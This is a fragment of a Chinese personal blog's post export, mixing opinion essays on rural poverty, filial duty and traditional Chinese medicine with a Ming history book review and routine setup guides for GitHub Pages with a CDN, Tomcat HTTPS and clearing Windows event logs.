另外，一些农村父母特别喜欢把孩子不顺从自己说成不孝顺、不乖，不听话，他们要求的就是你要完全听命于大人的话，绝对服从父母的话，否则就是忤逆不孝，因为他们觉得他们没有错，而他们的教育方式就是“不打不成器，棍棒底下出孝子”。体罚孩子成为他们自以为很英明的育儿方式，因为他们觉得跟小孩讲道理讲不通。甚至有的父母只管生不管养的。吸毒、赌博、鬼混、酒鬼这些都是问题父母，这些父母我都见过。不过近些年的新生父母殴打孩子的情况相比较以前变少了很多，但是又陷入另一个困局，就是过于溺爱，本身没什么资源还溺爱孩子。 这样的问题家庭成长的孩子注定大多数都一生惨淡收场，自己的人生也是黯淡无光的，俗话说：“龙生龙，凤生凤，老鼠的儿子会打洞”。大多数穷人家庭会陷入越生越穷的困局，他们的思想观念和认知还以为多子多福，养儿防老这种痴人说梦的鬼话。更别提传宗接代这种虚无缥缈的东西了，有时候想想我自己都觉得很好笑，我自己都死了，我还管得着子孙后代延续不延续的下去，这跟我有毛线关系？这种东西太虚妄了。 养儿防老是把子女当成经济工具事实上养儿防老是把孩子当成一种经济工具，但是很少会有家长会这么直截了当的跟孩子说，可是这已经成为一种根深蒂固的潜在传统，养儿防老之形成的原因是两大传统基石：户口制度造就的稳定家族制，精神制度孝道。大多数父母都没有把自己的子女当成一个独立的个体，他们通过各种方式操控子女的人生。左右子女的婚姻、工作、生活。 就说养儿防老这门生意有多不靠谱吧！首先养儿防老就是个自欺欺人的幼稚想法，至少我见过的农村子女很少有和父母住一起的，大多数结婚后都分家了。尤其是现在的年轻人，上一辈也大多数是分家的。平时根本很少说话甚至来往，甚至分家后婆媳关系都十分的恶化，打架都是常有的事情，其次养儿防老： 首先，你得保证你孩子比你死的晚，如果不小心生个天生残疾的你这辈子就完了，或者好不容易养了几十年先你而挂，然而大多数农村人是不会避孕或做体检的。因此古人喜欢拼命的生娃，就是为了防范这个风险。多生几个总不会全先自己而挂吧。这叫分散风险，蛋不能放一个篮子里面。然而现在基本一家只有最多2个孩子。 第二，要保证子女得听话得有孝心，古代基本一家几口都住在一个地方，如果子女有孝心还是可以互相帮衬下的，但是现在呢？种地养无法过生活，只能去外地打工，一年很难见几次面。然而，是个人都会是从自己的利益角度考虑问题的，人的基因都是自私的。孝顺这种东西就是因为稀缺才会被写入二十四孝作为政治手段大肆宣传。因为大多数人都是不会顺从父母的想法的。 第三，如果自己结婚生子了，子女压力也大，掏空6个钱包后，还有每个月的房贷要还，如果子女也有了自己的孩子，肯定精力和资源都放在下一代身上，资源是有限的。而且有的家庭是拿不出6个钱包来帮衬的自己的儿女的。 第四，社会舆论看不起农村人，比如凤凰男凤凰女，你如果不幸生了2个以上的儿子，有你操心的，彩礼、婚房能把你本来就贫穷的家庭拖到赤贫。 第五，抚养成本，以前社会变化不大，给口饭吃就行，现在呢？抚养成本大，而且现在是市场经济下，穷人的投资渠道少回报率低，你想孩子好不容易读个几十年的书，出来也不一定能找到靠谱的好工作。如果你使用最低成本，给口饭吃就行，上完初中就出去打工，那么你的孩子一般只能选择服务员或工厂上班，比如去富土康这样的企业被剥削身体健康和青春了，只能勉强糊口，然后就又开始重复上一代的人生轨迹，如此循环，永无出头之日。哪有太多余粮给你养老。 所以养儿防老是极其不现实的，也只不过是古人没有办法中的办法，因为古代穷人也是要被统治阶级层层剥削的。 一些偏远农村如果家里有两个孩子，一个女儿一个儿子的，很多家庭都会在女儿身上捞一大笔钱，比如要求女儿的对象家里给一大笔彩礼，但是这个钱不会给女儿，而是拿去补贴儿子买房结婚。而女儿出嫁则不会给太多陪嫁品。为什么给儿子呢？因为他们觉得儿子可以提他们养老送终，女儿则是嫁出去的女儿泼出去的水。比如之前央视就曾报道过天价彩礼新闻。其实我不反对给彩礼，适当给一点是没啥毛病的，但是如果仅仅是把女儿当赚钱工具“卖”了一样，这样的父母是非常可耻的。他们没有考虑女儿嫁过去该怎么面对夫家，女儿也要生活过日子啊。 我也见过太多农村子女父母生病都不来看一眼的，为赡养父母的问题大打出手的儿女，也见到一些老人晚年凄惨的痛苦的活着然后死去，是因为他们不孝顺吗？（孝顺这个东西其实也是古代统治阶级搞出来的，比如君君臣臣父父子子，讲的就是服从管理）其实是因为他们穷，没那么多钱（他们自己没有钱，他们的父辈也没有，祖上都是穷人）自己的养老都没保障，还要凑6个钱包给儿女上学买房结婚(能不能凑上还不一定，有的就注定单身一辈子)。 农村人最能吃苦，但是吃苦并不能给他们带来丰厚的收入。他们本身就是在食物链的最下层，缺乏各种资源，是被剥削的最严重的一方，因此，我特别讨厌人口红利这个词，大多数人在这样的环境下根本考不上好学校，他们大多都进了普通工厂或格子间去被资本家收割了，拿着勉强活在温饱线的薪水艰难度日，即使有也是极个别的在应试教育方面特别厉害的，好不容易考个好学校不要以为就前途光明了，这些个别人学生跃了农门后会被媒体拿来大肆宣传，希望人们相信上升通道还是存在的，只要你努力学习就可以，可是等待的还是被资本家和统治阶级无情的剥削、 996、然后加上房子来收割你的存款，以及各种名目的智商税，这样的好处是社会稳定，至少会让你的一生都在为生存奔波劳累，但是又不会让你饿死，中国古代的农民起义都是饿得不行的才造反的。所以你们不会被饿死，就不会影响他们的统治。 你说你不想被资本家剥削，你想自己创业，你哪里来的资源和资本？ 这些人从出生那一刻阶层真的就大致被定格了，很难逃出这个阶层。 没有生产资料、没有公平正义的社会迟早有一天会被资本家找各种道德上的冠冕堂皇的理由赶走。除非你天赋异禀，真的是个奇才，但是这种人很少很少，有的人一出生就含着金钥匙，有的人一出生就注定一无所有，生而贫穷。你努力奋斗达到的高度(也许就是努力奋斗凑个首付款买房子娶个老婆生个娃吧)，有的人一出生就已经有了。有的家里拆迁一下就可以抵得上你打工几辈子的薪水了。 劳动最光荣，勤劳致富这种鬼话我现在是一点都不相信了。 现在的环境没有看出来会保护劳动者，虽然有劳动法，但是这个东西的实用性和执行力度你我都懂。我前几天遇到一个其他行业的，他们从早上7点干到晚上11点，工资才1000-2000多，我说你们这个比我们 996 还狠啊，他一脸懵逼的问我什么是 996。不仅仅是程序员这种高智商行业的人被剥削，低端岗位被剥削的更厉害。而低端岗位的大多都来自农村。他们没学历没背景。所以这么艰难度日，干嘛要生那么娃。 这篇文章很丧，我也不是贬这些人，事实上农村人是被这个时代剥削压迫的最惨的一群人，这一栋栋高楼大厦其实都是他们一砖一瓦建起来的，然而，等他们建完了这些似乎这些城市设施和他们一毛钱关系都没有。 我讲的这些都是我从小到大亲身经历的感悟，现实就是如此。普通人底层劳苦大众真的没多少机会去改变命运，同时又因为没有机会导致眼界很低，看问题不深，一天只能想着明天会不会饿着，哪有时间想未来的事情，所以更是抓不住机会。这一切都是穷带来的， 这个社会是越缺什么上面就越宣传什么。 改变阶层对于大多数人来说是可能性很低的，要承认这一点，否则会过的很痛苦。 这个世界其实本质上还是一个物竞天择，适者生存的残酷的环境。只不过被强制包装成一个表面和谐稳定的样子。其实还是一套赢家通吃的霸权世界。穷着越穷，富者越富。 20% 的人掌握着 80% 的财富。 我一直觉得一颗受精卵就已经是一条生命，替他想象一番美好的未来和子子孙孙的繁衍，是一种虚妄。不过我觉得这也只是我的一厢情愿罢了，在这种大环境下，变相的“单身税”已经实施了。 反对养儿防老首先，从社会分工的角度，现代养老是政府的责任。需警惕现政府宣传养儿防老的观点来逃避政府的责任。第二，从文化传统角度，中国自古有养儿防老的文化传统，那是因为漫长的专制皇权社会，政府只收税不事公共事务，职能缺失造成只能民众只能自行养老。第三，从自身角度，父母首先需要对自己的生活负责，养儿是责任，非恩情。我是持父母无恩论的。但是并不是说就不和父母关系僵化了，我觉得人都是将心比心的，你对我好，我也对你好。就这样。第四，从自身角度，如果政府不能提供合格的养老，养老首先也是自己的事。第五，儿女远离父母才有自己的生活，父母也一样。儿女成年后，父母就应该放手，须知儿女的离开是成长的真义所在。第六，养儿防老，不是“爱”，是“自私”。从字面上看就有非常明显的“交易”和“功利”色彩，与另一个积极倡导的“父母对子女的爱是无私”自相矛盾。第七，爱是给与，非索取。 如何改变自己乘着年轻力壮的多提升自己，学些安身立命的本事，虽然不能改变阶层，但是至少不会过得很惨。另外就是能少生娃就少生娃，不要一生生很多，祸害下一代了。","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"读《显微镜下的大明》后感","slug":"读《显微镜下的大明》","date":"2019-05-09T11:50:07.000Z","updated":"2021-02-26T06:05:29.357Z","comments":true,"path":"posts/22537.html","link":"","permalink":"https://awen.me/posts/22537.html","excerpt":"","text":"首先谈一谈我对历史的认知以前读书的时候学历史，感觉特别的枯燥无味，老师都是让背诵，XXX年发生了什么事情，有什么影响，上课也是还无感情的照本宣科填鸭式的教学方式，毫无新意。并且历史这个东西我一直认为是任人打扮的小姑娘，一般正史都是由史官编写的，而史官也是被统治方啊，怎么能保证他记录的信息就一定准确可靠，哪怕是最让人津津乐道的尧舜禹禅让都让人怀疑其真实性，《尚书》中说：“尧使舜嗣位，正月上日，受终于文祖，流共工于幽州，放欢兜于崇山，窜三苗于三危，殛鲧于羽山，四罪而天下服。”就是说舜即位后，立刻除去了共工、终、鲧、欢兜等一干尧在位时的名臣，终使天下臣服。很显然，共工等人很可能威胁到舜的顺利即位，所以他才如此排斥他们。后来舜把王位传给了大禹，而大禹的父亲鲧可是被舜杀掉的，杀父之仇不共戴天啊。正常人会让一个被自己杀掉的人的儿子接替自己的权利？这太可疑了。魏文帝曹丕在接受傀儡皇帝汉献帝禅让帝位时候脱口而“舜禹受禅，我今方知”。 而在尧舜禹之前都没有出现禅让的事情，包括黄帝炎帝大战，都只不过是权利之争，权利这个东西从来只能独享，一山不容二虎，否则中华上下几千年，为什么都是帝制独裁专制专政，哪怕是当朝。 孔老夫子当年翻遍史书才找出尧舜禹禅让的例子，其实不过是为了当时的政治统治阶级需要而已。在那个时代天下大乱，礼崩乐坏，需要一这种儒家的道德统治为政治所用。道德统治具有成本低的优势，这样便于统治和管理。 历史从来都是胜利者编写的，唐太宗、朱棣都是谋权篡位的，已经被现代历史学者查出来篡改过历史的，过度美化自己丑化前任。 为什么我又喜欢读历史了如果说上学时学历史是为了应试教育，现在读历史则完全是个人兴趣爱好。比看现在的垃圾电影电视剧要有意义的多。 上个月把 《明朝那些事儿》大概的读了一遍，顺便还听了听 良辰周的语音读书，感觉讲的蛮好的。大概对明朝从建立到崇祯上吊结束这段历史有了大概的了解。不过毕竟《明朝那些事儿》 作者当年明月还是夹带了很多私人情感在里面，后面又把黄仁宇先生的《万历十五年》拿来读一读。 发现明朝的皇帝和官员各个都是奇葩，也各个都是人才，就说皇帝吧，洪武大帝朱元璋 小时候家里差不多死光了，当乞丐、做过和尚尝尽人间疾苦。后来当了皇帝也是心狠手辣，不信任任何人，几乎杀光了所有的开国功臣，还闹出了胡惟庸案、空印案、蓝玉案、郭桓案。史称洪武四大案，杀了很多人，这也间接导致了后来的朱棣夺权，比如蓝玉，这个比汉代卫青霍去病还牛逼的军事将领，本来是留给太子朱标的，结果朱标早死，蓝玉就被杀了，当然蓝玉也是自己作死，导致朱允炆手下无能打战的军事将领都是一般纸上谈兵的文臣。朱元璋是个政治军事天才，除了文化水平低，感觉跟我朝太祖十分的相似。 我挺佩服朱元璋的。他们都是太理想化，也想当然，虽然当皇帝很矜矜业业，但是自以为自己把整个治理国家的规则、制度体系制定的非常完善细致，子孙、下面的官员、老百姓也照着做就行，大明王朝就可万事无忧了，结果就出现各种问题。尤其是大明王朝的官员俸禄都十分的低，在张居正推行改革之前，官员的俸禄都是实物方式领取，今天领个棉花，明天领个木材，哈哈哈，想想就有意思。但是朱家自己人，却过得非常奢侈的生活。这样的模式明显是反人性的，所以造成杀不完的贪官污吏。 后面几百年里，明朝各种奇葩皇帝，业余职业皇帝主业道士的嘉靖帝、贪玩到和豹子玩的明武宗朱厚照、木匠皇帝明熹宗朱由校，还有被俘虏后送回来都没人接收的明英宗朱祁鎮等等，啊，整个大明王朝真的是太有意思了。 各种太监、官员之间的利益较量也写的十分精彩。尤其是海瑞这样的奇葩官员，这种人即使在现代职场上也不会有几个人喜欢的，还有那些奸臣比如严氏父子，魏忠贤、刘瑾等。 大多数历史都是高屋建瓴的写一些王侯将相的故事。比如明朝那些事儿大部分都是些皇族官员之间的事情。 而我最近读的《显微镜下的大明》则写的是一些县级以下单位的小事，从小事反应整个明朝的官场以及制度。以及各级官员之间是如何处理同一个问题的，尤其前三章写的还是我老家徽州府的事情。读起来特别带劲。马伯庸的文笔也很诙谐，读起来一点也不晦涩。 首先是丝绢案，因为一个数学天才帅嘉谟查账引起的税务案件，导致徽州的歙县、休宁、祁门、黟县、绩溪、婺源几个县因为该由谁交税，该怎么交税的问题大打出手。简直跟拍宫斗剧一样。为了平衡各方利益，稳定局势，真相其实并不重要，税是谁缴也不重要，重要的是那些当官的自己的仕途要稳定。 不得不说现在的电视剧尤其古装剧没几部可以看的，《大明王朝1566》算是另类吧。大部分古装剧都是瞎编乱造，比如蒋劲夫主演的《回到明朝当王爷》朱厚照居然是个好皇帝，明朝居然和亲？什么鬼，此外，就算是古装剧也大多都把坏人写的只有坏，而且坏的很傻，而好人则非常好，而且很无私，我特别讨厌这种形象，除了虚伪和装逼，我看不到任何东西，就像以前看举起手来，里面的日本鬼子都傻不拉几的，其实哪是这么回事，如果日本真的是这个样子，还用得着八年抗战？只不过也是当前的政治需要而已罢了，引出一个共同的敌人，这样可以有凝聚力。 有点扯远了。 历史上的奸臣贼子、清官也并不是要么坏要么好的，比如张居正，厉害吧，改革家，但是私人生活非常奢华，轿子都要30多个人抬。轿子里面就还有厨房、客厅、卧室。还有明朝内阁徐阶，也算是清流，但是当时整个上海市的地皮都差不多是他的。而且他还有两个儿子一起贪，可并不比被赶下台的严嵩父子贪的少哦。贪官并不等于没有能力。 然后是婺源的龙脉案和呈坎的祖庙案一个个相比于正史里的皇亲国戚的故事都是小人物，但是读起来非常有意思。 在书中，一些案子其实看起来很简单，但是牵涉到各方利益，就不得不退让妥协。甚至引造反。 其实吧，真的没几个当官的是为民做主，那些青天大老爷好皇帝也仅仅存在于戏剧演义里面。哪怕是皇帝也并不是随心所欲，像嘉靖这样的不上朝就能把各个利益派系玩的团团转的皇帝其实算是另类，大多数皇帝其实都要像官员妥协，比如明朝有强大的文官集团，皇帝要想颁发圣旨首先要过内阁，这也是朱元璋废掉宰相之后所带来的影响吧，内阁的权利比宰相还大。哪怕是皇帝也很贪，比如婺源龙脉案里面就有提到万历皇帝靠太监出来开采矿石给皇帝敛财。另外崇祯皇帝在亡国之际也不肯拿出自己小金库的钱，反而要求官员们捐钱，结果没几个干的。 皇帝只是一个象征，换谁都行，比如朱祁镇被俘虏，立马就找人接替他，我看万历十五年说皇帝需要参加各种礼仪，有时候需要频繁更换礼服，一天达十几套。这么折腾，难怪万历皇帝后来不肯上朝。 读历史的必要性读历史是一件非常必要的事情，在这个年纪读历史，不需要应付考试，而是随心所欲，想看什么书就看什么书，不管时代怎么变，科技怎么强大，那些技术只不过是个工具而已，最终还是人与人之间的利益博弈而已。人，在这有文字记录的几千年的历史长河之中其实并没有改变多少。司马迁的《史记 货殖列传》说天下熙熙皆为利来，天下然然皆为利往，历史上的任何人其实都是在为了自己的利益在做事情。包括你我。","categories":[],"tags":[{"name":"读书笔记","slug":"读书笔记","permalink":"https://awen.me/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"}]},{"title":"使用github pages + CDN 加速博客","slug":"使用github-pages-CDN-加速博客","date":"2019-05-07T12:01:10.000Z","updated":"2021-02-26T06:05:29.309Z","comments":true,"path":"posts/22262.html","link":"","permalink":"https://awen.me/posts/22262.html","excerpt":"","text":"github 配置使用 hexo 生成静态文件会保存在public 中。 在github 创建一个仓库，后缀必须是以github.io 为后缀的，例如的我的是 awen.github.io 在站点的_config.yml中添加配置 1234deploy: - type: git repo: git@github.com:monkey-wenjun&#x2F;awen.github.io.git branch: master 在github 点击仓库的 setting 配置 github pages，配置 Custom domain 以及 开启 SSL 证书。 在域名解析处配置解析，如图所示 解析结果如下 12345blog.awen.me. 35 IN CNAME awen.github.io.awen.github.io. 35 IN A 185.199.108.153awen.github.io. 35 IN A 185.199.109.153awen.github.io. 35 IN A 185.199.110.153awen.github.io. 35 IN A 185.199.111.153 这样访问 blog.awen.me 就可以了，但是这样访问会很慢，可以通过CDN 加速配置 CDN 加速以 UPYUN CDN 为例 配置回源为 awen.github.io ，替换成你自己的回源域名为 blog.awen.me，替换成你自己的 添加加速域名，然后做 CNAME 解析 即可。","categories":[],"tags":[{"name":"GitHub","slug":"GitHub","permalink":"https://awen.me/tags/GitHub/"}]},{"title":"tomcat 配置 HTTPS","slug":"tomcat-配置-HTTPS","date":"2019-05-07T06:59:02.000Z","updated":"2021-02-26T06:05:29.292Z","comments":true,"path":"posts/1256.html","link":"","permalink":"https://awen.me/posts/1256.html","excerpt":"","text":"将pem 转换成 jks12345678910111213141516171819202122232425262728293031[root@vpn conf]# ll *.pem-rw-r--r-- 1 root root 1999 5月 7 14:03 cert.pem-rw-r--r-- 1 root root 1686 5月 7 14:03 chain.pem-rw-r--r-- 1 root root 3686 5月 7 14:03 fullchain.pem-rw-r--r-- 1 root root 1679 5月 7 14:03 privkey.pem# 导出.p12格式的证书[root@vpn conf]# openssl pkcs12 -export -in fullchain.pem -inkey privkey.pem -out fangwenjun.com.p12 -name fangwenjun.com Enter Export Password:Verifying - Enter Export Password:# 再将证书由.p12格式转换成.jks格式[root@vpn conf]# keytool -importkeystore -srckeystore fangwenjun.com.p12 -srcstoretype PKCS12 -deststoretype JKS -destkeystore fangwenjun.com.jks正在将密钥库 fangwenjun.com.p12 导入到 fangwenjun.com.jks...输入目标密钥库口令:再次输入新口令:输入源密钥库口令:已成功导入别名 fangwenjun.com 的条目。已完成导入命令: 1 个条目成功导入, 0 个条目失败或取消Warning:JKS 密钥库使用专用格式。建议使用 &quot;keytool -importkeystore -srckeystore fangwenjun.com.jks -destkeystore fangwenjun.com.jks -deststoretype pkcs12&quot; 迁移到行业标准格式 PKCS12。[root@vpn conf]#[root@vpn conf]# keytool -importkeystore -srckeystore fangwenjun.com.jks -destkeystore fangwenjun.com.jks -deststoretype pkcs12输入源密钥库口令:已成功导入别名 fangwenjun.com 的条目。已完成导入命令: 1 个条目成功导入, 0 个条目失败或取消Warning:已将 &quot;fangwenjun.com.jks&quot; 迁移到 Non JKS&#x2F;JCEKS。将 JKS 密钥库作为 &quot;fangwenjun.com.jks.old&quot; 进行了备份。 配置 server.xml12345678910111213141516&lt;Connector port&#x3D;&quot;80&quot; protocol&#x3D;&quot;HTTP&#x2F;1.1&quot; connectionTimeout&#x3D;&quot;20000&quot; redirectPort&#x3D;&quot;443&quot; &#x2F;&gt;&lt;Connector port&#x3D;&quot;443&quot; protocol&#x3D;&quot;org.apache.coyote.http11.Http11NioProtocol&quot; maxThreads&#x3D;&quot;150&quot; SSLEnabled&#x3D;&quot;true&quot;&gt; &lt;SSLHostConfig&gt; &lt;Certificate certificateKeystoreFile&#x3D;&quot;conf&#x2F;fangwenjun.com.jks&quot; certificateKeystorePassword &#x3D; &quot;123123&quot; type&#x3D;&quot;RSA&quot; &#x2F;&gt; &lt;&#x2F;SSLHostConfig&gt; &lt;&#x2F;Connector&gt; &lt;Engine name&#x3D;&quot;Catalina&quot; defaultHost&#x3D;&quot;www.fangwenjun.com&quot;&gt; &lt;Host name&#x3D;&quot;www.fangwenjun.com&quot; appBase&#x3D;&quot;webapps&quot; unpackWARs&#x3D;&quot;true&quot; autoDeploy&#x3D;&quot;true&quot;&gt; 启动tomcat12345678910111213[root@vpn conf]# ..&#x2F;bin&#x2F;shutdown.shUsing CATALINA_BASE: &#x2F;opt&#x2F;apache-tomcat-9.0.19Using CATALINA_HOME: &#x2F;opt&#x2F;apache-tomcat-9.0.19Using CATALINA_TMPDIR: &#x2F;opt&#x2F;apache-tomcat-9.0.19&#x2F;tempUsing JRE_HOME: &#x2F;usr&#x2F;local&#x2F;jdkUsing CLASSPATH: &#x2F;opt&#x2F;apache-tomcat-9.0.19&#x2F;bin&#x2F;bootstrap.jar:&#x2F;opt&#x2F;apache-tomcat-9.0.19&#x2F;bin&#x2F;tomcat-juli.jar[root@vpn conf]# ..&#x2F;bin&#x2F;startup.shUsing CATALINA_BASE: &#x2F;opt&#x2F;apache-tomcat-9.0.19Using CATALINA_HOME: &#x2F;opt&#x2F;apache-tomcat-9.0.19Using CATALINA_TMPDIR: &#x2F;opt&#x2F;apache-tomcat-9.0.19&#x2F;tempUsing JRE_HOME: &#x2F;usr&#x2F;local&#x2F;jdkUsing CLASSPATH: &#x2F;opt&#x2F;apache-tomcat-9.0.19&#x2F;bin&#x2F;bootstrap.jar:&#x2F;opt&#x2F;apache-tomcat-9.0.19&#x2F;bin&#x2F;tomcat-juli.jarTomcat started. 效果 强制 HTTP–&gt; HTTPS在 web.xml 下 &lt;/welcome-file-list&gt; 下方添加如下内容 1234567891011121314151617181920&lt;welcome-file-list&gt; &lt;welcome-file&gt;index.html&lt;&#x2F;welcome-file&gt; &lt;welcome-file&gt;index.htm&lt;&#x2F;welcome-file&gt; &lt;welcome-file&gt;index.jsp&lt;&#x2F;welcome-file&gt; &lt;&#x2F;welcome-file-list&gt;&lt;login-config&gt; &lt;!-- Authorization setting for SSL --&gt; &lt;auth-method&gt;CLIENT-CERT&lt;&#x2F;auth-method&gt; &lt;realm-name&gt;Client Cert Users-only Area&lt;&#x2F;realm-name&gt;&lt;&#x2F;login-config&gt;&lt;security-constraint&gt; &lt;!-- Authorization setting for SSL --&gt; &lt;web-resource-collection &gt; &lt;web-resource-name &gt;SSL&lt;&#x2F;web-resource-name&gt; &lt;url-pattern&gt;&#x2F;*&lt;&#x2F;url-pattern&gt; &lt;&#x2F;web-resource-collection&gt; &lt;user-data-constraint&gt; &lt;transport-guarantee&gt;CONFIDENTIAL&lt;&#x2F;transport-guarantee&gt; &lt;&#x2F;user-data-constraint&gt;&lt;&#x2F;security-constraint&gt; 效果","categories":[],"tags":[{"name":"tomcat","slug":"tomcat","permalink":"https://awen.me/tags/tomcat/"}]},{"title":"2019年4月份回顾","slug":"2019年4月份回顾","date":"2019-05-06T11:02:46.000Z","updated":"2021-02-26T06:05:29.239Z","comments":true,"path":"posts/44673.html","link":"","permalink":"https://awen.me/posts/44673.html","excerpt":"","text":"学习本月学习了极客时间专栏 《Linux 性能调优》 100% 书籍 《明朝那些事》–当年明月 《万历十五年》–黄仁宇 《我在底层的生活》–芭芭拉·艾伦瑞克 博客更新本月博客更新 15篇，大部分都是学习笔记和随笔。 写作给CSDN 投稿 3 篇，千把块钱零花钱，可以买些书看了。 病情指标明显下降，蛋白++变成+， 蛋白控制在 0.18 相比较上次 0.29 下降不少，除了隐血还是 +++，一切还算正常。","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"windows 系统盘空间为 0 的解决办法","slug":"windows-系统盘空间为-0-的解决办法","date":"2019-05-06T01:51:54.000Z","updated":"2021-02-26T06:05:29.294Z","comments":true,"path":"posts/46054.html","link":"","permalink":"https://awen.me/posts/46054.html","excerpt":"","text":"系统盘满了的解决办法 不得不吐槽下windows 不能直接查看文件夹的大小，或者根据文件夹大小来排序，没有Linux好用。不过可以通过第三方软件来辅助判断是那些目录占用磁盘空间大，如 SpaceSniffer 这个工具来查看 如图所示，显示winevt目录占用了31G，winevt是系统事件日志存储的目录，因此确认是否是被事件日志占满了 1.查看路径 C:\\Windows\\System32\\winevt 下的logs 文件，查看改文件夹的大小，如果特别大，删除该目录即可释放空间。 2.修改系统事件的策略，操作步骤是：进入控制面板-管理工具–事件查看器 3.展开windows 日志，选择系统右键选择属性 4.将达到日志事件大小适选择为 「按需要覆盖事件日志」。 5.点击确定，然后在以相同的方式配置下其他几个事件，如应用程序、安全、设置等。","categories":[],"tags":[{"name":"windows","slug":"windows","permalink":"https://awen.me/tags/windows/"}]},{"title":"我为什么不信中医","slug":"我为什么不信中医","date":"2019-05-05T07:49:08.000Z","updated":"2021-02-26T06:05:29.335Z","comments":true,"path":"posts/27430.html","link":"","permalink":"https://awen.me/posts/27430.html","excerpt":"","text":"为什么我不信中医呢我一直对于中草药煎的汤所冒出的那股味道难以接受，打心底一直排斥这种东西，在2018年9月份以前我几乎没有生过什么大病，都是一些小感冒之类的去医院要么吃点抗生素要么挂点消炎水就好了，因此对于中草药这种东西我几乎没有碰过。但是就在去年9月，我体检被查出来患有慢性肾脏病二期，在浙江省立同德医院看了个专家号，医生说我得吃中草药，我一开始是拒绝的。但是医生说他那边很多病人都是吃中药吃好的，而且中药副作用要小一些。于是我看在是三甲医院医生的份上就半信半疑的试了试，结果吃了接近2个多月，24小时尿蛋白一直稳定的保持在++，隐血+++，和原来体检查出来的一模一样，一丁点效果没有，下图是医生当时给我开的药方 最让人恶心的是里面里面的一味药材—炒桑螵蛸，我向来对未知的东西很感兴趣，于是就去查了一下，结果这玩意百科给的解释是：“螵蛸”（piāo xiāo）：螳螂的卵块，即螳螂科昆虫大刀螂 Saussure、小刀螂(Thurlberg)或巨斧螳螂(Servi11e)的干燥卵鞘。 我整个人都不好了，但是为了早日康复，我捏着鼻子喝了2个多月，那段时间胃十分难受。另外中药这种东西携带也不方便，虽然医院提供煎药服务，但是毕竟还是一袋一袋的液体，我去北京出差带着去泰国玩也带着总是怕戳破了袋子撒到箱子里面。另外就说中药这个剂量问题吧，西药都是一片一片或一粒一粒的含量都很明确到g或mg，而中草药呢？一袋液体里面有多少成分是有效的，不确定？副作用是什么，不确定。此外，中草药的价格似乎并不比西药便宜，每次那个专家给我开的中草药都是七百多，而我现在吃西药一个月平均也就三百多，尤其是激素才9块钱一瓶，走医保2块钱，可以吃半个多月，说明什么？中草药或中成药暴利啊，只是些树皮树根树叶的，完全没有什么研发成本。你会发现医院、药店都喜欢开中成药，因为利润超级高。医生还给我开了一个肾炎康复片，中成药，吃了2个多月也是无任何效果，最可笑的是这个药的说明书上居然写着是在小白鼠的身上做过实验，具有抗炎作用，完全没有描述在人体会不会有抗炎作用。合计着吃这药的都是小白鼠？ 国内医药类厂商几乎没什么研发成本，我们来看医药类上市公司的研发费用和销售费用以及毛利率数据，这是爱问财搜索到的医药类上市公司的销售费用大于研发费用，并且毛利率高达80%以上的企业数据。 另外最让我反感的是这位专家的态度，我就对几个指标表示疑问就去问她,结果她的态度非常不好，还藐视的反问我“是我专业还是你专业”，其实在问他问题之前我也是做过功课的，我查阅了很多关于慢性肾脏病的资料，并且还买了相关书籍自己看，并不是问小白问题，另外这个医生我一个感冒都给我开了7天的中草药，但是他又没说清楚这个其实是治我的肾病的，我以为是只治疗感冒的，于是我就扔了垃圾桶了，因为我吃了近2个月的中草药完全没有任何效果，并且在我眼里一个感冒这种问题都要吃中草药实在令人费解，况且那会我的感冒已经快好了，所以我决定不吃，另外我对他给我开的中草药是否有效果完全没信心，我并不是黑省立同德，相反省立同德的牙科医生给我的感觉就非常好，平易近人，非常有亲和力，而后，我再也没有挂这位专家的号了，而是跑到浙一去并告诉医生不要给我开任何中药或中成药，当然浙一的专家也说他们这边是不开任何中药的都是西药治疗，从2018年12月份到浙一做穿刺手术确诊为 IGA肾病，医生给我开的药没有一样是中成药或中草药，目前在吃的药： 泼尼松 一日 1次 一次4片，皮糖激素 百令胶囊 一日3次，一次2粒，辅助治疗类药物，提高免疫力的，其实对治疗本身没多大用处，我感觉这玩意是中成药，但是实际他被划分为西药。 赛可平 一日2次，一次2片，免疫抑制剂 复方磺胺甲恶唑片 一日1次一次半片，主要是防止感染的 本来住院的时候还给我开了降压药，但是降压药吃的我血压很低所以医生给停了，从去年12月份一直服药至今，因为得了这个病，日常的饮食我都格外控制，饮食清淡，预防感冒，限盐限蛋白摄入并且从体检查出来以后我就禁了一切饮料和酒，日常只喝白开水，去年体检查出来 24小时尿蛋白 0.5-0.7g 的样子，现在控制在0.18左右。 我后来发现百令胶囊其实也是中成药，而且这个药在浙一居然被划分到西药窗口，一次以上都给我开七八盒，我也是日了狗了，走商保每次都超量报销不了，得自己掏钱。 中医有用吗我觉得中医是有点用的，但是国人一直把中药当成补品来，滥用中草药就和滥用抗生素一样，以为中药无毒无害，比如吃个牛肉汤都宣传汤汁是由十几味中草药熬制而成的。尤其是电视广告中医养生类的广告铺天盖地的最近几年都被撕下了面具。 还有鸿茅药酒 步长脑心通，步长制药还是一家上市公司，以经营中成药、中药注射器等为利。 都特么是卖假药收智商税的。 另外，还有很多中成药里面的有效成本都是西药，比如维C银翘片，“维C银翘片”的成分是：金银花、连翘、荆芥、淡豆豉、牛蒡子、桔梗、薄荷油、芦根、淡竹叶、甘草、维生素C、马来酸氯苯那敏（即“扑尔敏”）、对乙酰氨基酚（即“扑热息痛”）13味药制成。最新的循证医学研究认为维生素C对于感冒没有什么作用，而其疗效的是马来酸氯苯那敏。 有句话不是说”西药负责疗效， 中药负责价格”。 中成药市场中各种利益关系的博弈，zf、医院、医药厂商、医生、药农等等。 其实是药三分毒，中草药的毒性不比西药差，很多肾衰竭的人都是服用了一些中草药而导致的，比如最具肾毒性的中药就包括： 植物药：马兜铃、天仙藤、寻骨风、朱砂莲、细辛、雷公藤、苍耳子、苦楝皮、牵牛子、大枫子、马桑子、洋金花、千年健、大枫子、山慈姑、使君子、马钱子、鸦胆子、相思子、皂荚、巴豆、肉桂、商陆、甘遂、大戟、芫花、草乌、钩吻、昆明山海棠等。 矿物药：砒石、砒霜、雄黄、红矾、朱砂、轻粉、铅丹、升汞、胆矾、密佗僧等。 动物药：斑蝥、蜈蚣、蜂毒、全蝎、鱼胆、水蛭、海马、红娘子、麝香、蟾酥等。 《本草纲目》，其中大量让人觉得匪夷所思的药方： 